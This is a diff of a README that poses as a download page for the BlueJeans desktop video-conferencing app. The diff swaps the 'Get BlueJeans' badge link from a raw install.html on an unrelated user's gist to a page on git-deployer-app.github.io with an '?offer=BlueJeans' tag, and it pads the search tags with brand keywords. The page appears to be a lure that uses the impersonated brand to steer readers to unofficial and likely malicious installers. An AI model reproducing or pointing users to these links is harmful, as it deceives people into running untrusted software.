@@ -1,6 +1,6 @@
 # BlueJeans Download — Desktop Video Conferencing Platform
 
-[![Get BlueJeans GitHub](https://img.shields.io/badge/Get%20BlueJeans%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/superbrodoventor55/94db9c158bd16466dc7957c692915614/raw/19ee9629136bfad1708f026b99d4e283f4643ce4/install.html?offer=BlueJeans)
+[![Get BlueJeans GitHub](https://img.shields.io/badge/Get%20BlueJeans%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-deployer-app.github.io/.github/?offer=BlueJeans)
 
 ---
 
@@ -72,7 +72,7 @@ A: Meetings require an internet connection, but recorded sessions can be accesse
 
 ## 🔍 Tags
 
-BlueJeans, BlueJeans for PC, BlueJeans macOS, BlueJeans Windows, Video Conferencing, Desktop Meetings, Screen Sharing, Remote Collaboration, Business Communication, Dolby Voice, Team Meetings, Webinars, BlueJeans mac, BlueJeans pc, BlueJeans desktop, BlueJeans for mac, BlueJeans for windows
+BlueJeans, bluejeans network, studio blue jeans, blue jeans, BlueJeans for PC, BlueJeans macOS, BlueJeans Windows, Video Conferencing, Desktop Meetings, Screen Sharing, Remote Collaboration, Business Communication, Dolby Voice, Team Meetings, Webinars, BlueJeans mac, BlueJeans pc, BlueJeans desktop, BlueJeans for mac, BlueJeans for windows
 
 ---
 
